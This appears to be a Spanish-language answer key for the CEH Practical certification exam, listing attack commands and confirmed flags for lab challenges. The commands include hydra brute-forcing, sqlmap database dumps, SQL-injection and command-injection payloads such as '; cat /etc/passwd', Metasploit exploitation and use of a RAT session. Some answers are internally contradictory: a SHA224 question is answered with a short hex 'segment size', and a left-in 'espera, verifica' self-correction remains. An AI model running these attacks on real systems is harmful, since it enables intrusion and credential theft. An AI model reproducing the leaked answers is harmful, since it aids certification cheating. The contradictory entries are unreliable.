# CEH Practical – Procedimientos (ANS_1.docx)

Cada desafío incluye el comando/herramienta a usar y la respuesta ya confirmada en tu documento, para que valides tu procedimiento.

---

### Challenge 1 — Product Version del Domain Controller
```
nmap -A [rango subred]
```
Revisa el banner del puerto 389/445/88; nmap suele imprimir la versión de Windows Server directamente.
**ANS: 10.0.20348**

---

### Challenge 2 — Contar servicios "mercury" en la red
```
nmap -A -p- [rango subred]
```
Cuenta cuántos puertos reportan el banner "Mercury" (Mercury Mail/FTP Server).
**ANS: 7**

---

### Challenge 3 — RDP + crackear + hide.cfe + CRC32
1. Descubre hosts con RDP:
```
nmap -p 3389 --open 10.10.55.0/24
```
2. Crackea credenciales de Jones:
```
hydra -l Jones -P /usr/share/wordlists/rockyou.txt rdp://[IP]
```
3. Conéctate y ubica `hide.cfe`:
```
xfreerdp /u:Jones /p:<password> /v:[IP]
```
4. `.cfe` es un contenedor de **CryptoForge** — descífralo con la contraseña de Jones (GUI de CryptoForge Decrypt).
5. Calcula el CRC32 de la imagen resultante (usa un calculador CRC32 — HashCalc o `crc32` de Python/7-Zip):
```
python3 -c "import zlib; print(hex(zlib.crc32(open('imagen.ext','rb').read())))"
```
**ANS: 2bb407ea**

---

### Challenge 4 — Esteganografía en dispositivo móvil
1. Accede al dispositivo (ADB si hay debugging habilitado):
```
adb connect [IP]:5555
adb shell
adb pull /sdcard/<ruta>/imagen
```
2. Extrae el dato oculto (steghide/OpenStego según la imagen):
```
steghide extract -sf imagen.jpg
```
**ANS: F!AgBr^V0**

---

### Challenge 5 — CVE de menor severidad
1. Escaneo de vulnerabilidades con OpenVAS sobre 192.168.44.32.
2. Ordena por severidad ascendente en el reporte.
**ANS: CVE-2020-7068**

---

### Challenge 6 — Exploit remoto en Linux + leer Netnormal.txt
1. Escanea el objetivo Linux e identifica el servicio de login remoto/ejecución de comandos vulnerable (comúnmente **rlogin/rsh, Samba, o un exploit vía Metasploit**):
```
nmap -sV -p- [IP]
```
2. Explota con Metasploit según el servicio identificado:
```
msfconsole
search <servicio>
use <exploit>
set RHOSTS [IP]
run
```
3. Una vez con shell:
```
cat Netnormal.txt
```
**ANS: H0m3@l0n3**

---

### Challenge 7 — restricted.txt con clave "password"
Archivo cifrado/esteganográfico, clave conocida = `password`:
```
steghide extract -sf restricted.txt -p password
```
o si es un contenedor OpenSSL:
```
openssl enc -d -aes-256-cbc -in restricted.txt -out out.txt -k password
```
**ANS: maddy@777**

---

### Challenge 8 — Sniffer.txt en share SMB
1. Enumera y accede al share SMB con las credenciales débiles:
```
smbclient -L //[IP]/ -U <usuario>
smbclient //[IP]/<share> -U <usuario>
```
2. Descarga y lee `Sniffer.txt`:
```
get Sniffer.txt
cat Sniffer.txt
```
**ANS: h@ck3r00t**

---

### Challenge 9 — SSH/login + escalación a root + imroot.txt
1. Conéctate con credenciales conocidas (shoulder surfing):
```
ssh marcus@[IP]
```
2. Escala privilegios (revisa sudo -l, SUID, cron, kernel exploit según la máquina):
```
sudo -l
find / -perm -4000 2>/dev/null
```
3. Una vez root:
```
cat imroot.txt
```
**ANS: JH8754@#!**

---

### Challenge 10 — Contar archivos en carpeta "Scan" vía RAT
Conéctate a la sesión activa del RAT/Meterpreter ya desplegado:
```
msfconsole
sessions -i [id]
cd C:\<ruta>\Scan
ls
```
Cuenta los archivos listados.
**ANS: 5**

---

### Challenge 11 — SHA224 del segmento PT_LOAD(0) de Strange_File-1
1. Ubica el archivo en la máquina EH Workstation-2:
```
C:\Users\Admin\Documents\Strange_File-1
```
2. Usa un analizador de headers ELF (readelf/objdump si es Linux, o herramienta equivalente en Windows como PEStudio/010 Editor) para identificar el offset y tamaño del segmento PT_LOAD(0):
```
readelf -l Strange_File-1
```
3. Extrae ese segmento específico (dd con offset/size) y calcula su hash:
```
dd if=Strange_File-1 of=segment.bin bs=1 skip=<offset> count=<size>
sha224sum segment.bin
```
**ANS: 000c54ec** (tamaño del segmento en hex, según el formato NNNaNNaa)

---

### Challenge 12 — DDoS: menor conteo de paquetes IPv4 y su IP origen
Analiza `Evil-traffic.pcapng` en Wireshark:
```
wireshark Evil-traffic.pcapng
```
Usa **Statistics → Conversations → IPv4** para ver el conteo de paquetes por IP, ordena ascendente y toma la IP con menor cantidad de paquetes enviados a la víctima.
Alternativa CLI:
```
tshark -r Evil-traffic.pcapng -q -z conv,ip
```
**ANS: 19554 paquetes / IP 172.20.0.21**

---

### Challenge 13 — SQLi en cinema.cehorg.com, password de Daniel
```
sqlmap -u "http://cinema.cehorg.com/<endpoint>" --cookie="<sesión con Karen/computer>" -D <db> -T users --dump
```
(o inyección manual si el punto de entrada es un formulario de login/búsqueda)
**ANS: qwertyuiop**

---

### Challenge 14 — Flag en page_id=95
Prueba SQLi/parameter tampering directo en la URL:
```
http://www.cehorg.com/index.php?page_id=95' OR '1'='1
```
o usa sqlmap:
```
sqlmap -u "http://www.cehorg.com/index.php?page_id=95" --dump
```
**ANS: B$#98TY**

---

### Challenge 15 — Vulnerability research en training.cehorg.com, Flag.txt
1. Identifica el CMS/vulnerabilidad (WPScan si es WordPress):
```
wpscan --url http://10.10.55.50 --enumerate vp
```
2. Explota con el exploit correspondiente (Metasploit/searchsploit) para obtener LFI/RCE y leer `Flag.txt`.
**ANS: M@d(y535**

---

### Challenge 16 — SQLi en cybersec.cehorg.com, columna Flag
```
sqlmap -u "http://192.168.44.40/<endpoint>" --dbs
sqlmap -u "..." -D <db> --tables
sqlmap -u "..." -D <db> -T <tabla> -C Flag --dump
```
**ANS: y83r5EC**

---

### Challenge 17 — Base64 en archivos subidos por DVWA
1. Login en DVWA (admin/password), revisa:
```
C:\wamp64\www\DVWA\ECweb\Certified\
```
2. Decodifica cada archivo candidato:
```
cat archivo.txt | base64 -d
```
**ANS: H^(ker@EC**

---

### Challenge 18 — Topic length en mensaje MQTT (IoT)
Analiza el pcap de tráfico IoT en Wireshark, filtra por MQTT:
```
mqtt.msgtype == 3
```
(MQTT Publish = tipo 3). Revisa el campo **Topic Length** del paquete Publish.
**ANS: 9**

---

### Challenge 19 — Crackear WPA de W!F!_Pcap.cap
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt W!F!_Pcap.cap
```
Cuenta los caracteres de la contraseña encontrada.
**ANS: 9 caracteres**

---

### Challenge 20 — Vigilar/crackear hash VeraCrypt (lts_File)
1. Crackea el hash en `Hash2crack.txt` (identifica tipo de hash primero):
```
hashid <hash>
hashcat -m <modo> Hash2crack.txt /usr/share/wordlists/rockyou.txt
```
2. Monta el volumen VeraCrypt con la contraseña obtenida:
```
veracrypt --text --mount lts_File /mnt/veracrypt1 --password=<password_crackeado>
```
3. Lee el archivo secreto:
```
cat /mnt/veracrypt1/EC_data.txt
```
**ANS: 3C_c0un(!L**

---

### Challenge 21 — DDoS: identificar IP atacante
```
wireshark attack-traffic.pcapng
```
**Statistics → Conversations → IPv4**, identifica la IP con mayor volumen de paquetes/SYN hacia la víctima (172.20.10.10... espera, verifica el target real 10.10.1.10 según tu enunciado).
**ANS: 172.20.0.21**

---

## BACKUP QUESTIONS

**1) Hash.txt vía DVWA — crackear MD5**
```
type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
```
Luego usa https://hashes.com/en/decrypt/hash con el valor obtenido.
**ANS: Cr@ck3d**

**2) Command injection en 10.10.10.25 — contar usuarios (excl. admin/Guest)**
Explota el campo vulnerable a command injection con:
```
; net user
```
o en Linux:
```
; cat /etc/passwd | grep /home
```
**ANS: 8**

**3) XSS en www.cehorg.com**
Prueba payload básico `<script>alert(1)</script>` en campos de entrada.
**ANS: No** (no vulnerable)

**4) SQLi en movies.cehorg.com (Jason/welcome) — contar usuarios**
```
sqlmap -u "http://movies.cehorg.com/<endpoint>" --cookie="<sesión Jason>" -D <db> -T users --count
```
**ANS: 9**

**5) Parameter tampering — usuario para id=1003**
```
http://movies.cehorg.com/user?id=1003
```
Modifica el parámetro directamente en la URL/Burp Suite.
**ANS: Linda**

**6) Bruteforce contraseña de adam en www.cehorg.com**
```
hydra -l adam -P /usr/share/wordlists/rockyou.txt www.cehorg.com http-post-form "..."
```
**ANS: orange1234**

**7) Load balancer de eccouncil.org**
```
curl -I https://eccouncil.org
```
o usa `wafw00f` / revisa headers de respuesta.
**ANS: cloudflare**

**8) Web crawling — contar PNG en /images**
```
wget -r -A png http://movies.cehorg.com/images/
```
o usa `httrack` / Burp Spider.
**ANS: 6**

**9) Web app recon — servidor HTTP de movies.cehorg.com**
```
curl -I http://movies.cehorg.com
whatweb movies.cehorg.com
```
**ANS: Microsoft-IIS/10.0**

**10) CMS de www.cehorg.com**
```
whatweb www.cehorg.com
```
**ANS: WordPress**

**11) Banner grabbing — ETag de movies.cehorg.com**
```
curl -I http://movies.cehorg.com
```
Revisa el header `ETag`.
**ANS: "8d13646dbb9bd61:0"**

**12) FTP en CEHORG — crackear y leer flag.txt**
```
hydra -L users.txt -P rockyou.txt ftp://[IP CEHORG]
ftp [IP]
get flag.txt
cat flag.txt
```
**ANS: Secrets@FTP**

**13) HTTP-recon — versión de Nginx en certifiedhacker.com**
```
curl -I https://www.certifiedhacker.com
whatweb certifiedhacker.com
```
Revisa el header `Server`.

**14) Clickjacking en www.goodshopping.com**
Verifica si falta el header `X-Frame-Options`:
```
curl -I https://www.goodshopping.com
```
Si no está presente (o es DENY/SAMEORIGIN), prueba con un iframe HTML de prueba.
**ANS: Yes**

**15) Session hijacking — protocolo en sniffsession.pcap**
```
wireshark sniffsession.pcap
```
Filtra y revisa qué protocolo de resolución (ARP spoofing) se usó para el sniffing.
**ANS: ARP**

---

**Nota:** Los retos 3, 6, 7, 11, 15 y 20 dependen de la extensión/tipo de archivo exacto que encuentres en la máquina real (los nombres de archivo cambian ligeramente entre variantes del simulador: hide.cfe, restricted.txt, Netnormal.txt, imroot.txt, Flag.txt, lts_File). Usa siempre `file <nombre>` primero para confirmar el tipo antes de elegir la herramienta de extracción/descifrado.
